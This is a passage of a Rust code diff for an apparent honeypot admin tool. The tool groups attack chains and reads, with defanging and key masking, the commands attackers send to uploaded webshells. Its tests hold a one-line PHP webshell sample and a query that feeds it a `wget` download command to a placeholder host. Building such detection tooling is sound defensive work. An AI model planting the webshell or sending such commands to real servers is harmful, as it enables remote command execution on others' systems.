@@ -24,6 +24,8 @@ use super::campaigns::HARD_FANOUT_MAX;
 use super::uploads::{self, HELD_TEXT, TimelineRow, UPLOAD_COLS, UploadRow};
 use crate::admin::views::link_href;
 use crate::model::defang::defang;
+use crate::model::xray::key::{holds_key, masked};
+use crate::model::xray::{LayerKind, Policy, Source, Xray, parse};
 use crate::trap::decoy::keeps_its_own_answer;
 use anyhow::Result;
 use sqlx::SqliteConnection;
@@ -52,6 +54,16 @@ const INSERT_BATCH: usize = 400;
 const UPLOADS_MAX: i64 = 64;
 /// A dead end: asked for within this long after the upload.
 const DEAD_END_SECS: i64 = 60;
+
+/// Most uploads whose timelines and dead ends a chain reads, newest first.
+const TIMELINE_UPLOADS: usize = 8;
+/// Most follow-ups a chain reads through the X-ray, in order. The rest are
+/// counted.
+const FOLLOW_READS_MAX: usize = 32;
+/// Most pieces a chain shows, joiners first. The rest are counted.
+const FOUND_MAX: usize = 200;
+/// Newest sources a chain pairs its exploits and tags in.
+const TAG_SOURCES_MAX: i64 = 2000;
 
 /// Most chains [`Store::chains_of`] builds: one forged body can name 256
 /// stagers, each its own chain.
@@ -307,7 +319,8 @@ pub async fn store_plan(tx: &mut SqliteConnection, plan: &Plan) -> Result<()> {
 pub async fn uploads_of(conn: &mut SqliteConnection, chain: &str) -> Result<Vec<UploadRow>> {
     Ok(sqlx::query_as(sqlx::AssertSqlSafe(format!(
         "SELECT {UPLOAD_COLS} WHERE u.id IN
-           (SELECT g.source_id FROM chain_pieces c JOIN piece_sightings g ON g.piece = c.piece
+           (SELECT g.source_id FROM chain_pieces c JOIN pieces p ON p.hash = c.piece
+            JOIN piece_sightings g ON g.piece = c.piece
             WHERE c.chain = ? AND g.source_kind = 'upload' AND g.role IN {JOINER_ROLES})
          ORDER BY u.id DESC LIMIT ?"
     )))
@@ -318,7 +331,8 @@ pub async fn uploads_of(conn: &mut SqliteConnection, chain: &str) -> Result<Vec<
 }
 
 /// What was sent to the chain's files, oldest first, at most
-/// [`uploads::TIMELINE_MAX`]: the uploads' timelines, from any address,
+/// [`uploads::TIMELINE_MAX`]: the timelines of its newest
+/// [`TIMELINE_UPLOADS`] uploads, from any address,
 /// without the requests to a path the trap answers itself. Until `411e2a6`
 /// a `PUT /` or `PUT /.env` made that path answer as a webshell for everyone,
 /// so those rows, `webshell` or not, are ordinary traffic and stay out.
@@ -332,12 +346,11 @@ async fn follow_ups_of(
     conn: &mut SqliteConnection,
     uploads: &[UploadRow],
 ) -> Result<Vec<TimelineRow>> {
+    let newest = &uploads[..uploads.len().min(TIMELINE_UPLOADS)];
     let mut rows = BTreeMap::new();
-    for u in uploads {
-        for r in uploads::timeline(conn, u).await? {
-            if !keeps_its_own_answer(&r.method, &r.path, r.query.as_deref()) {
-                rows.insert((r.ts.clone(), r.id), r);
-            }
+    for r in uploads::timelines(conn, newest).await? {
+        if !keeps_its_own_answer(&r.method, &r.path, r.query.as_deref()) {
+            rows.insert((r.ts.clone(), r.id), r);
         }
     }
     let rows = rows.into_values();
@@ -352,51 +365,56 @@ fn file_name(u: &UploadRow) -> Option<&str> {
     name.rsplit(['/', '\\']).next().filter(|n| !n.is_empty())
 }
 
-/// The requests that found nothing where an upload was expected: the same
-/// address, within [`DEAD_END_SECS`] after the upload, asks the same origin
-/// for a path ending in the file's name and gets a 404. `substr`, not
-/// `LIKE`: a `_` or `%` in the name is no wildcard.
-async fn dead_ends_of(conn: &mut SqliteConnection, u: &UploadRow) -> Result<Vec<TimelineRow>> {
-    let Some(name) = file_name(u) else {
-        return Ok(vec![]);
-    };
-    Ok(sqlx::query_as(
-        "SELECT r.id, r.ts, i.ip, r.method, r.path, r.query, r.status, r.answer
-         FROM requests r JOIN ips i ON i.id = r.ip_id
-         WHERE i.ip = ?1 AND r.origin IS ?2 AND r.status = 404
-           AND substr(r.path, -length(?3)) = ?3
-           AND r.ts <= datetime(?4, ?6)
-           AND (r.ts > ?4 OR (r.ts = ?4 AND r.id > ?5))
-         ORDER BY r.ts, r.id LIMIT ?7",
-    )
-    .bind(&u.ip)
-    .bind(&u.origin)
-    .bind(format!("/{name}"))
-    .bind(&u.ts)
-    .bind(u.request_id.unwrap_or(i64::MAX))
-    .bind(format!("+{DEAD_END_SECS} seconds"))
-    .bind(uploads::TIMELINE_MAX)
-    .fetch_all(&mut *conn)
-    .await?)
-}
-
 /// The dead ends of the chain's files, oldest first, at most
-/// [`uploads::TIMELINE_MAX`].
+/// [`uploads::TIMELINE_MAX`], from its newest [`TIMELINE_UPLOADS`] uploads.
 pub async fn dead_ends(conn: &mut SqliteConnection, chain: &str) -> Result<Vec<TimelineRow>> {
     let uploads = uploads_of(conn, chain).await?;
     dead_ends_for(conn, &uploads).await
 }
 
-/// [`dead_ends`] of these uploads.
+/// The requests that found nothing where an upload was expected: the same
+/// address, within [`DEAD_END_SECS`] after the upload, asks the same origin
+/// for a path ending in the file's name and gets a 404. `substr`, not
+/// `LIKE`: a `_` or `%` in the name is no wildcard. One statement, with a
+/// limit per upload.
 async fn dead_ends_for(
     conn: &mut SqliteConnection,
     uploads: &[UploadRow],
 ) -> Result<Vec<TimelineRow>> {
+    let newest = &uploads[..uploads.len().min(TIMELINE_UPLOADS)];
+    let named: Vec<(&UploadRow, String)> = newest
+        .iter()
+        .filter_map(|u| file_name(u).map(|n| (u, format!("/{n}"))))
+        .collect();
+    if named.is_empty() {
+        return Ok(vec![]);
+    }
+    let one = "SELECT * FROM (
+         SELECT r.id, r.ts, i.ip, r.method, r.path, r.query, r.status, r.answer
+         FROM requests r JOIN ips i ON i.id = r.ip_id
+         WHERE i.ip = ? AND r.origin IS ? AND r.status = 404
+           AND substr(r.path, -length(?)) = ?
+           AND r.ts <= datetime(?, ?)
+           AND (r.ts > ? OR (r.ts = ? AND r.id > ?))
+         ORDER BY r.ts, r.id LIMIT ?)";
+    let sql = vec![one; named.len()].join(" UNION ALL ");
+    let mut q = sqlx::query_as::<_, TimelineRow>(sqlx::AssertSqlSafe(sql));
+    for (u, name) in &named {
+        q = q
+            .bind(&u.ip)
+            .bind(&u.origin)
+            .bind(name)
+            .bind(name)
+            .bind(&u.ts)
+            .bind(format!("+{DEAD_END_SECS} seconds"))
+            .bind(&u.ts)
+            .bind(&u.ts)
+            .bind(u.request_id.unwrap_or(i64::MAX))
+            .bind(uploads::TIMELINE_MAX);
+    }
     let mut rows = BTreeMap::new();
-    for u in uploads {
-        for r in dead_ends_of(conn, u).await? {
-            rows.insert((r.ts.clone(), r.id), r);
-        }
+    for r in q.fetch_all(&mut *conn).await? {
+        rows.insert((r.ts.clone(), r.id), r);
     }
     let rows = rows.into_values();
     Ok(rows.take(uploads::TIMELINE_MAX as usize).collect())
@@ -490,6 +508,8 @@ pub struct Chain {
     pub sources: i64,
     pub first_seen: String,
     pub last_seen: String,
+    /// Pieces past [`FOUND_MAX`], in no stage.
+    pub more: i64,
 }
 
 impl Chain {
@@ -750,67 +770,239 @@ fn payload_rows(found: &[Found], uploads: &[UploadRow], here: &Here) -> Vec<Stag
     }]
 }
 
-/// One row per distinct request, in order, with how often it came.
+/// One row per distinct `shown`, in order, with how often it came.
 fn request_rows(
     requests: &[TimelineRow],
+    shown: impl Fn(&TimelineRow) -> String,
     detail: impl Fn(&TimelineRow, i64) -> String,
     mark: Mark,
     here: &Here,
 ) -> Vec<StageRow> {
-    let mut sent: Vec<(&TimelineRow, i64, bool)> = vec![];
+    let mut sent: Vec<(&TimelineRow, String, i64, bool)> = vec![];
     let mut at = HashMap::new();
     for r in requests {
-        let same = (&r.method, &r.path, &r.query);
-        let i = *at.entry(same).or_insert(sent.len());
+        let text = shown(r);
+        let i = *at
+            .entry((text.clone(), &r.method, &r.path))
+            .or_insert(sent.len());
         if i == sent.len() {
-            sent.push((r, 0, false));
+            sent.push((r, text, 0, false));
         }
-        sent[i].1 += 1;
-        sent[i].2 |= here.requests.contains(&r.id);
+        sent[i].2 += 1;
+        sent[i].3 |= here.requests.contains(&r.id);
     }
-    let rows = sent.into_iter().map(|(r, n, used)| {
-        let shown = match &r.query {
-            Some(q) => format!("{} {}?{q}", r.method, r.path),
-            None => format!("{} {}", r.method, r.path),
-        };
-        StageRow {
-            here: used,
-            href: Some(format!("/admin/requests/{}", r.id)),
-            ..row(label(&shown), detail(r, n), mark)
-        }
+    let rows = sent.into_iter().map(|(r, text, n, used)| StageRow {
+        here: used,
+        href: Some(format!("/admin/requests/{}", r.id)),
+        ..row(text, detail(r, n), mark)
     });
     rows.collect()
 }
 
-/// The Follow-up stage: where the trap stopped the chain, what was sent to
-/// its files, or a gap.
-fn follow_up_rows(
+/// What came after a chain's uploads.
+#[derive(Default)]
+struct FollowUps {
+    dead: Vec<TimelineRow>,
+    /// Read through the X-ray, in order, at most [`FOLLOW_READS_MAX`].
+    sent: Vec<TimelineRow>,
+    /// What each of `sent` runs, by id, where the X-ray could tell.
+    reads: HashMap<i64, String>,
+    /// Past `sent`: counted, not read.
+    unread: i64,
+}
+
+/// A follow-up as the X-ray reads it.
+struct Sent {
+    id: i64,
+    ip: String,
+    method: String,
+    path: String,
+    query: Option<String>,
+    body: Option<Vec<u8>>,
+}
+
+/// The inputs a chain's webshells read, from their profiles.
+fn shell_inputs(found: &[Found]) -> Vec<String> {
+    let profiles = found.iter().filter(|p| p.kind == "shell-profile");
+    let lists = profiles.filter_map(|p| p.value.split(';').find_map(|f| f.strip_prefix("input=")));
+    let inputs: BTreeSet<&str> = lists.flat_map(|l| l.split(',')).collect();
+    inputs.into_iter().map(str::to_string).collect()
+}
+
+/// `bytes` as one line of text, if there is any.
+fn one_line(bytes: &[u8]) -> Option<String> {
+    let text = String::from_utf8_lossy(bytes);
+    let text = text.replace(char::is_control, " ");
+    Some(text.trim().to_string()).filter(|t| !t.is_empty())
+}
+
+/// What `r` hands the input a webshell reads, like `$_GET[cmd]` or
+/// `php://input`. Other inputs, such as a header, are not stored here.
+fn input_value(x: &Xray, r: &Sent, input: &str) -> Option<String> {
+    let body = r.body.as_deref().unwrap_or_default();
+    if input == "php://input" {
+        return one_line(body);
+    }
+    let (source, name) = input
+        .strip_prefix("$_")?
+        .strip_suffix(']')?
+        .split_once('[')?;
+    let field = |text: &[u8]| {
+        let fields = serde_urlencoded::from_bytes::<Vec<(String, String)>>(text);
+        let fields = fields.unwrap_or_default().into_iter();
+        fields
+            .filter(|(k, _)| k == name)
+            .find_map(|(_, v)| one_line(v.as_bytes()))
+    };
+    let query = r.query.as_deref().unwrap_or_default().as_bytes();
+    let from_query = || {
+        matches!(source, "GET" | "REQUEST")
+            .then(|| field(query))
+            .flatten()
+    };
+    let from_body = || {
+        let posted = matches!(source, "POST" | "REQUEST");
+        let part = || {
+            let parts = x
+                .layers
+                .iter()
+                .filter(|l| l.kind == LayerKind::MultipartField);
+            parts
+                .filter(|l| l.name.as_deref() == Some(name.as_bytes()))
+                .find_map(|l| one_line(&l.text))
+        };
+        posted.then(|| field(body).or_else(part)).flatten()
+    };
+    from_query().or_else(from_body)
+}
+
+/// What a follow-up runs: the literal command a shell's input received, or
+/// the recipe the X-ray found. A request holding a private key shows only
+/// its recipe, which has no literal text in it.
+fn read_sent(r: &Sent, inputs: &[String]) -> Option<String> {
+    let x = parse(
+        Source::Request {
+            method: &r.method,
+            path: &r.path,
+            query: r.query.as_deref(),
+            body: r.body.as_deref(),
+            sender: Some(&r.ip),
+        },
+        Policy::embedded(),
+    );
+    let key = holds_key(&x);
+    let command = || inputs.iter().find_map(|i| input_value(&x, r, i));
+    let literal = if key { None } else { command() };
+    let recipe = || {
+        x.recipes
+            .iter()
+            .map(|l| l.normal.clone())
+            .find(|n| !n.is_empty())
+    };
+    let withheld = || key.then(|| format!("{} [private key withheld]", r.method));
+    literal.or_else(recipe).or_else(withheld)
+}
+
+/// What came after these uploads, the first [`FOLLOW_READS_MAX`] follow-ups
+/// read through the X-ray off the async threads. A request that carried an
+/// upload is read without its body: that is upload content.
+async fn gather_follow_ups(
+    conn: &mut SqliteConnection,
     uploads: &[UploadRow],
-    follow: &[TimelineRow],
-    dead: &[TimelineRow],
-    here: &Here,
-) -> Vec<StageRow> {
+    found: &[Found],
+) -> Result<FollowUps> {
+    let dead = dead_ends_for(conn, uploads).await?;
     let stopped: HashSet<i64> = dead.iter().map(|r| r.id).collect();
+    let mut sent = follow_ups_of(conn, uploads).await?;
+    sent.retain(|r| !stopped.contains(&r.id));
+    let unread = sent.len().saturating_sub(FOLLOW_READS_MAX) as i64;
+    sent.truncate(FOLLOW_READS_MAX);
+    if sent.is_empty() {
+        return Ok(FollowUps {
+            dead,
+            ..FollowUps::default()
+        });
+    }
+    let ids = sent.iter().map(|r| r.id.to_string()).collect::<Vec<_>>();
+    let bodies: Vec<(i64, Option<Vec<u8>>)> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
+        "SELECT r.id, CASE WHEN EXISTS(SELECT 1 FROM uploads u WHERE u.request_uid = r.uid)
+                      THEN NULL ELSE r.body END
+         FROM requests r WHERE r.id IN ({})",
+        ids.join(",")
+    )))
+    .fetch_all(&mut *conn)
+    .await?;
+    let mut bodies: HashMap<i64, Option<Vec<u8>>> = bodies.into_iter().collect();
+    let requests: Vec<Sent> = sent
+        .iter()
+        .map(|r| Sent {
+            id: r.id,
+            ip: r.ip.clone(),
+            method: r.method.clone(),
+            path: r.path.clone(),
+            query: r.query.clone(),
+            body: bodies.remove(&r.id).flatten(),
+        })
+        .collect();
+    let inputs = shell_inputs(found);
+    let reads = tokio::task::spawn_blocking(move || {
+        let read = requests.iter().filter_map(|r| {
+            let text = read_sent(r, &inputs)?;
+            Some((r.id, text))
+        });
+        read.collect::<HashMap<_, _>>()
+    })
+    .await?;
+    Ok(FollowUps {
+        dead,
+        sent,
+        reads,
+        unread,
+    })
+}
+
+/// The Follow-up stage: where the trap stopped the chain, what was sent to
+/// its files, read through the X-ray, or a gap.
+fn follow_up_rows(uploads: &[UploadRow], f: &FollowUps, here: &Here) -> Vec<StageRow> {
+    let target = |r: &TimelineRow| label(&masked(&format!("{} {}", r.method, r.path)));
     let dead_end = |_: &TimelineRow, n: i64| {
         let asked = count(n, "request", "requests");
         format!("{asked}: 404 within {DEAD_END_SECS} seconds of the upload")
     };
+    let shown = |r: &TimelineRow| match (f.reads.get(&r.id), &r.query) {
+        (Some(read), _) => label(read),
+        (None, Some(q)) => label(&format!("{} {}?{q}", r.method, r.path)),
+        (None, None) => label(&format!("{} {}", r.method, r.path)),
+    };
     let sent = |r: &TimelineRow, n: i64| {
         let asked = count(n, "request", "requests");
-        match (r.answer.as_deref(), r.status) {
+        let mut detail = match (r.answer.as_deref(), r.status) {
             (Some(answer), Some(status)) => format!("{asked} · {answer} {status}"),
             (Some(answer), None) => format!("{asked} · {answer}"),
             (None, Some(status)) => format!("{asked} · {status}"),
             (None, None) => asked,
+        };
+        if f.reads.contains_key(&r.id) {
+            detail = format!("{detail} · {}", target(r));
         }
+        detail
     };
-    let mut rows = request_rows(dead, dead_end, Mark::DeadEnd, here);
-    let follow: Vec<TimelineRow> = follow
-        .iter()
-        .filter(|r| !stopped.contains(&r.id))
-        .cloned()
-        .collect();
-    rows.extend(request_rows(&follow, sent, Mark::Seen, here));
+    let mut rows = request_rows(&f.dead, target, dead_end, Mark::DeadEnd, here);
+    rows.extend(request_rows(&f.sent, shown, sent, Mark::Seen, here));
+    if f.unread > 0 {
+        let more = count(f.unread, "more request", "more requests");
+        rows.push(StageRow {
+            href: uploads.first().map(|u| {
+                let uid = crate::admin::public::urlencode(&u.uid);
+                format!("/admin/traps/uploads/{uid}")
+            }),
+            ..row(
+                more,
+                "Not read here; the upload's timeline lists them.".into(),
+                Mark::Seen,
+            )
+        });
+    }
     if rows.is_empty() {
         let detail = if uploads.is_empty() {
             "The commands never ran here."
@@ -828,8 +1020,7 @@ struct Parts<'a> {
     found: &'a [Found],
     tags: &'a [(i64, i64)],
     uploads: &'a [UploadRow],
-    follow: &'a [TimelineRow],
-    dead: &'a [TimelineRow],
+    follow: &'a FollowUps,
 }
 
 fn stages(p: &Parts<'_>, here: &Here) -> [Stage; 5] {
@@ -838,10 +1029,7 @@ fn stages(p: &Parts<'_>, here: &Here) -> [Stage; 5] {
         ("Command", command_rows(p.found, here)),
         ("Delivery", delivery_rows(p.key, p.found, p.uploads, here)),
         ("Payload", payload_rows(p.found, p.uploads, here)),
-        (
-            "Follow-up",
-            follow_up_rows(p.uploads, p.follow, p.dead, here),
-        ),
+        ("Follow-up", follow_up_rows(p.uploads, p.follow, here)),
     ]
     .map(|(name, rows)| Stage { name, rows });
     if here.dim {
@@ -872,44 +1060,27 @@ fn sources_in(sources: &[(u8, i64)]) -> String {
     )
 }
 
-/// The newest chains holding one of these sources' joiners.
-async fn keys_of_sources(
+/// The newest chains with a joiner in a sighting `cond` picks. `campaign`
+/// binds a `?` in `cond`.
+async fn keys_where(
     conn: &mut SqliteConnection,
-    sources: &[(u8, i64)],
+    cond: &str,
+    campaign: Option<&str>,
     max: usize,
 ) -> Result<Vec<String>> {
-    Ok(sqlx::query_scalar(sqlx::AssertSqlSafe(format!(
+    let sql = format!(
         "SELECT c.key FROM piece_sightings g
          JOIN chain_pieces m ON m.piece = g.piece
          JOIN pieces p ON p.hash = g.piece
          JOIN chains c ON c.key = m.chain
-         WHERE g.role IN {JOINER_ROLES} AND {}
-         GROUP BY c.key ORDER BY c.last_seen DESC, c.key LIMIT ?",
-        sources_in(sources)
-    )))
-    .bind(max as i64)
-    .fetch_all(&mut *conn)
-    .await?)
-}
-
-/// The newest chains with a joiner sighted from these addresses.
-async fn keys_of_addresses(
-    conn: &mut SqliteConnection,
-    ips: &[i64],
-    max: usize,
-) -> Result<Vec<String>> {
-    let ips = ips.iter().map(i64::to_string).collect::<Vec<_>>().join(",");
-    Ok(sqlx::query_scalar(sqlx::AssertSqlSafe(format!(
-        "SELECT c.key FROM piece_sightings g
-         JOIN chain_pieces m ON m.piece = g.piece
-         JOIN pieces p ON p.hash = g.piece
-         JOIN chains c ON c.key = m.chain
-         WHERE g.role IN {JOINER_ROLES} AND g.ip_id IN ({ips})
+         WHERE g.role IN {JOINER_ROLES} AND {cond}
          GROUP BY c.key ORDER BY c.last_seen DESC, c.key LIMIT ?"
-    )))
-    .bind(max as i64)
-    .fetch_all(&mut *conn)
-    .await?)
+    );
+    let mut q = sqlx::query_scalar(sqlx::AssertSqlSafe(sql));
+    if let Some(key) = campaign {
+        q = q.bind(key);
+    }
+    Ok(q.bind(max as i64).fetch_all(&mut *conn).await?)
 }
 
 /// A chain from its key; `None` when nothing of it is left to show.
@@ -923,35 +1094,58 @@ async fn keyed(conn: &mut SqliteConnection, key: &str, here: &Here) -> Result<Op
         return Ok(None);
     };
     // From `chain_pieces`, not from the sources: a source naming a joiner
-    // of another chain must not show it here.
+    // of another chain must not show it here. The key's joiner, then the
+    // other joiners, then what most addresses share.
     let found: Vec<Found> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
-        "SELECT p.hash, p.kind, p.value, g.role, MAX(g.grade = 'seen') AS seen, p.ips
-         FROM chain_pieces m JOIN pieces p ON p.hash = m.piece
-         JOIN piece_sightings g ON g.piece = p.hash
-         WHERE m.chain = ? AND g.role IN {STRIP_ROLES}
-         GROUP BY p.hash, g.role ORDER BY p.value"
+        "WITH top AS (
+           SELECT p.hash, p.kind, p.value, p.ips
+           FROM chain_pieces m JOIN pieces p ON p.hash = m.piece
+           WHERE m.chain = ?1
+           ORDER BY p.hash IS ?2 DESC, p.kind IN ('stager', 'key', 'file') DESC,
+                    p.ips DESC, p.value
+           LIMIT ?3)
+         SELECT t.hash, t.kind, t.value, g.role, MAX(g.grade = 'seen') AS seen, t.ips
+         FROM top t JOIN piece_sightings g ON g.piece = t.hash
+         WHERE g.role IN {STRIP_ROLES}
+         GROUP BY t.hash, g.role ORDER BY t.value"
     )))
     .bind(key)
+    .bind(key_piece(key))
+    .bind(FOUND_MAX as i64)
     .fetch_all(&mut *conn)
     .await?;
     if found.is_empty() {
         return Ok(None);
     }
+    let shown = found.iter().map(|p| p.hash).collect::<HashSet<_>>().len() as i64;
+    let mut more = 0;
+    if shown >= FOUND_MAX as i64 {
+        let all: i64 = sqlx::query_scalar(
+            "SELECT COUNT(*) FROM chain_pieces m JOIN pieces p ON p.hash = m.piece
+             WHERE m.chain = ?",
+        )
+        .bind(key)
+        .fetch_one(&mut *conn)
+        .await?;
+        more = all - shown;
+    }
     let tags: Vec<(i64, i64)> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
-        "WITH src AS (SELECT DISTINCT g.source_kind AS k, g.source_id AS i
-           FROM chain_pieces m JOIN piece_sightings g ON g.piece = m.piece
-           WHERE m.chain = ? AND g.role IN {JOINER_ROLES})
+        "WITH src AS (SELECT g.source_kind AS k, g.source_id AS i
+           FROM chain_pieces m JOIN pieces p ON p.hash = m.piece
+           JOIN piece_sightings g ON g.piece = m.piece
+           WHERE m.chain = ?1 AND g.role IN {JOINER_ROLES}
+           GROUP BY g.source_kind, g.source_id ORDER BY MAX(g.ts) DESC LIMIT ?2)
          SELECT DISTINCT e.piece, t.piece FROM src
          JOIN piece_sightings e ON e.source_kind = src.k AND e.source_id = src.i
          JOIN piece_sightings t ON t.source_kind = src.k AND t.source_id = src.i
          WHERE e.role = 'exploit' AND t.role = 'tag'"
     )))
     .bind(key)
+    .bind(TAG_SOURCES_MAX)
     .fetch_all(&mut *conn)
     .await?;
     let uploads = uploads_of(conn, key).await?;
-    let follow = follow_ups_of(conn, &uploads).await?;
-    let dead = dead_ends_for(conn, &uploads).await?;
+    let follow = gather_follow_ups(conn, &uploads, &found).await?;
     let stages = stages(
         &Parts {
             key: Some(key),
@@ -959,7 +1153,6 @@ async fn keyed(conn: &mut SqliteConnection, key: &str, here: &Here) -> Result<Op
             tags: &tags,
             uploads: &uploads,
             follow: &follow,
-            dead: &dead,
         },
         here,
     );
@@ -970,6 +1163,7 @@ async fn keyed(conn: &mut SqliteConnection, key: &str, here: &Here) -> Result<Op
         sources,
         first_seen,
         last_seen,
+        more,
     }))
 }
 
@@ -1046,11 +1240,13 @@ async fn read_sources(
     let shared: BTreeSet<(i64, i64)> = shared.collect();
     span.ips = ips.len() as i64;
     span.sources = held.len() as i64;
-    Ok(Some((
-        found.into_values().collect(),
-        shared.into_iter().collect(),
-        span,
-    )))
+    let mut found: Vec<Found> = found.into_values().collect();
+    let joins = |p: &Found| matches!(p.role.as_str(), "stager" | "key" | "file");
+    found.sort_by_key(|p| (!joins(p), std::cmp::Reverse(p.ips)));
+    span.more = found.len().saturating_sub(FOUND_MAX) as i64;
+    found.truncate(FOUND_MAX);
+    found.sort_by(|a, b| a.value.cmp(&b.value));
+    Ok(Some((found, shared.into_iter().collect(), span)))
 }
 
 /// What a chain without a key covers.
@@ -1060,6 +1256,7 @@ struct Span {
     sources: i64,
     first_seen: String,
     last_seen: String,
+    more: i64,
 }
 
 impl Span {
@@ -1091,8 +1288,7 @@ async fn unkeyed(
     .bind(UPLOADS_MAX)
     .fetch_all(&mut *conn)
     .await?;
-    let follow = follow_ups_of(conn, &uploads).await?;
-    let dead = dead_ends_for(conn, &uploads).await?;
+    let follow = gather_follow_ups(conn, &uploads, &found).await?;
     let stages = stages(
         &Parts {
             key: None,
@@ -1100,7 +1296,6 @@ async fn unkeyed(
             tags: &tags,
             uploads: &uploads,
             follow: &follow,
-            dead: &dead,
         },
         here,
     );
@@ -1111,6 +1306,7 @@ async fn unkeyed(
         sources: span.sources,
         first_seen: span.first_seen,
         last_seen: span.last_seen,
+        more: span.more,
     }))
 }
 
@@ -1136,13 +1332,13 @@ async fn of_sources(
 ) -> Result<Vec<Chain>> {
     here.dim = true;
     let pieces: Vec<i64> = sqlx::query_scalar(sqlx::AssertSqlSafe(format!(
-        "SELECT g.piece FROM piece_sightings g WHERE {}",
+        "SELECT DISTINCT g.piece FROM piece_sightings g WHERE g.role IN {STRIP_ROLES} AND {}",
         sources_in(sources)
     )))
     .fetch_all(&mut *conn)
     .await?;
     here.pieces.extend(pieces);
-    let keys = keys_of_sources(conn, sources, max).await?;
+    let keys = keys_where(conn, &sources_in(sources), None, max).await?;
     let chains = all_keyed(conn, keys, &here).await?;
     if !chains.is_empty() {
         return Ok(chains);
@@ -1158,7 +1354,8 @@ async fn of_piece(conn: &mut SqliteConnection, hash: i64) -> Result<Vec<Chain>> 
         ..Here::default()
     };
     let key: Option<String> = sqlx::query_scalar(sqlx::AssertSqlSafe(format!(
-        "SELECT m.chain FROM chain_pieces m JOIN piece_sightings g ON g.piece = m.piece
+        "SELECT m.chain FROM chain_pieces m JOIN pieces p ON p.hash = m.piece
+         JOIN piece_sightings g ON g.piece = m.piece
          WHERE m.piece = ? AND g.role IN {JOINER_ROLES} LIMIT 1"
     )))
     .bind(hash)
@@ -1288,12 +1485,14 @@ impl Store {
                 of_sources(conn, &sources, here, max).await
             }
             Anchor::Ip(ip) => {
-                let keys = keys_of_addresses(conn, &[ip], max).await?;
-                let pieces: Vec<i64> =
-                    sqlx::query_scalar("SELECT piece FROM piece_sightings WHERE ip_id = ?")
-                        .bind(ip)
-                        .fetch_all(&mut *conn)
-                        .await?;
+                let keys = keys_where(conn, &format!("g.ip_id = {ip}"), None, max).await?;
+                let pieces: Vec<i64> = sqlx::query_scalar(sqlx::AssertSqlSafe(format!(
+                    "SELECT DISTINCT piece FROM piece_sightings
+                     WHERE ip_id = ? AND role IN {STRIP_ROLES}"
+                )))
+                .bind(ip)
+                .fetch_all(&mut *conn)
+                .await?;
                 let here = Here {
                     pieces: pieces.into_iter().collect(),
                     ..Here::default()
@@ -1301,12 +1500,9 @@ impl Store {
                 all_keyed(conn, keys, &here).await
             }
             Anchor::Campaign(key) => {
-                let members: Vec<i64> =
-                    sqlx::query_scalar("SELECT ip_id FROM campaign_members WHERE campaign_key = ?")
-                        .bind(key)
-                        .fetch_all(&mut *conn)
-                        .await?;
-                let keys = keys_of_addresses(conn, &members, max).await?;
+                let members = "g.ip_id IN
+                    (SELECT ip_id FROM campaign_members WHERE campaign_key = ?)";
+                let keys = keys_where(conn, members, Some(key), max).await?;
                 all_keyed(conn, keys, &Here::default()).await
             }
             Anchor::Piece(hash) => of_piece(conn, hash).await,
@@ -1319,6 +1515,7 @@ impl Store {
             format!(
                 "WHERE c.key IN (SELECT m.chain FROM piece_sightings g
                    JOIN chain_pieces m ON m.piece = g.piece
+                   JOIN pieces p ON p.hash = m.piece
                    WHERE g.role IN {JOINER_ROLES} AND g.ip_id IN ({who}))"
             )
         };
@@ -1333,7 +1530,7 @@ impl Store {
             "SELECT c.key, c.first_seen, c.last_seen, c.ips, c.sources,
                (SELECT COUNT(*) FROM chain_pieces x JOIN pieces p ON p.hash = x.piece
                 WHERE x.chain = c.key AND p.kind = 'exploit') AS exploits,
-               EXISTS(SELECT 1 FROM chain_pieces x
+               EXISTS(SELECT 1 FROM chain_pieces x JOIN pieces p ON p.hash = x.piece
                  JOIN piece_sightings g ON g.piece = x.piece AND g.source_kind = 'upload'
                  JOIN uploads u ON u.id = g.source_id
                  WHERE x.chain = c.key AND g.role IN {JOINER_ROLES} AND {HELD_TEXT}) AS text_held
@@ -1930,8 +2127,7 @@ mod tests {
                     found: &[],
                     tags: &[],
                     uploads: &[],
-                    follow: &[],
-                    dead: &[],
+                    follow: &FollowUps::default(),
                 },
                 &Here::default(),
             ),
@@ -1939,6 +2135,7 @@ mod tests {
             sources: 0,
             first_seen: String::new(),
             last_seen: String::new(),
+            more: 0,
         };
         let names = c.stages.each_ref().map(|s| s.name);
         assert_eq!(
@@ -2127,6 +2324,281 @@ mod tests {
         let row = rows.iter().find(|r| r.label == "GET /up/a[.]php").unwrap();
         assert_eq!(row.mark, Mark::Seen);
         assert_eq!(row.detail, "2 requests · webshell 200");
+    }
+
+    /// A request to `path` with this query and body.
+    async fn sent(s: &Store, path: &str, query: Option<&str>, body: Option<&[u8]>) -> i64 {
+        let ip_id = s.upsert_ip(OTHER.parse().unwrap()).await.unwrap().id;
+        s.insert_request(&NewRequest {
+            ip_id,
+            method: "POST".into(),
+            path: path.into(),
+            query: query.map(Into::into),
+            body: body.map(<[u8]>::to_vec),
+            headers_json: "[]".into(),
+            labels_json: "[]".into(),
+            answer: Some("webshell".into()),
+            status: Some(SHELL),
+            ts: Some(LATER.into()),
+            ..Default::default()
+        })
+        .await
+        .unwrap()
+    }
+
+    async fn pieces_pass(s: &Store) {
+        extract(&s.pool).await.unwrap();
+        run(s).await;
+    }
+
+    /// The Follow-up rows of `uid`'s chain.
+    async fn follow_rows(s: &Store, uid: &str) -> Vec<StageRow> {
+        let chains = s.chains_of(Anchor::Upload(uid)).await.unwrap();
+        stage(&chains[0], "Follow-up").to_vec()
+    }
+
+    const SHELL_GET: &[u8] = b"<?php system($_GET['tool']); echo 'a shell of 32 bytes or so'; ?>";
+
+    #[tokio::test]
+    async fn a_follow_up_shows_the_command_its_shell_reads() {
+        let (s, _d) = store().await;
+        let uid = seed_upload(&s, UPLOADER, "/up/a.php", SHELL_GET).await;
+        let by_query = "tool=wget+http%3A%2F%2Fexample.org%2Fx";
+        sent(&s, "/up/a.php", Some(by_query), None).await;
+        // Not the shell's input: `cmd` means nothing to this one.
+        sent(&s, "/up/a.php", Some("cmd=id"), None).await;
+        pieces_pass(&s).await;
+        let rows = follow_rows(&s, &uid).await;
+        let row = rows
+            .iter()
+            .find(|r| r.label.starts_with("wget"))
+            .expect("read");
+        assert_eq!(row.label, "wget hxxp://example[.]org/x");
+        assert_eq!(row.detail, "1 request · webshell 200 · POST /up/a[.]php");
+        assert!(
+            rows.iter().any(|r| r.label == "POST /up/a[.]php?cmd=id"),
+            "{rows:?}"
+        );
+    }
+
+    #[tokio::test]
